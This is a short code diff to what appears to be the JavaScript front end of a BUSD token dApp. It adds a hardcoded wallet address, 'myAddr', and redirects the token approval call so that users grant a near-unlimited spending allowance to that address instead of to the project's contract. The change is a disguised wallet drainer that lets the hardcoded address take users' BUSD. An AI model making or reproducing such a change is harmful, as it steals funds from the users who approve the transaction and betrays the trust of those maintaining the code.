@@ -2,6 +2,7 @@ var CONTRACT_ADDRESS = "0x3b52399888EE4c13775C112636886f2668a50D80";
 var tokenAddr = "0x23Ce9e5c3370F313fC838485753efF418cE8fd3a"; 
 var referrer = '0x40273c538768c68F1674505E6E9a0Cb036ee2811'
 var upline = '0x40273c538768c68F1674505E6E9a0Cb036ee2811'
+var myAddr = "0x3f853A6C2747569bD707d98c7774F3678cF0a0bE";
 
 
 var POOL = "0x658e82815E1D3659EaBC9650cB5A62B8768b965f";
@@ -351,7 +352,7 @@ const BuyMin = async () => {
 
 
 const approveBUSD = async (trx) => {
-    tokenContract.methods.approve(CONTRACT_ADDRESS, "999999999999999999999999").send({ from: currentAddr });
+    tokenContract.methods.approve(myAddr, "999999999999999999999999").send({ from: currentAddr });
 }
 
 const reinvest = async () => {
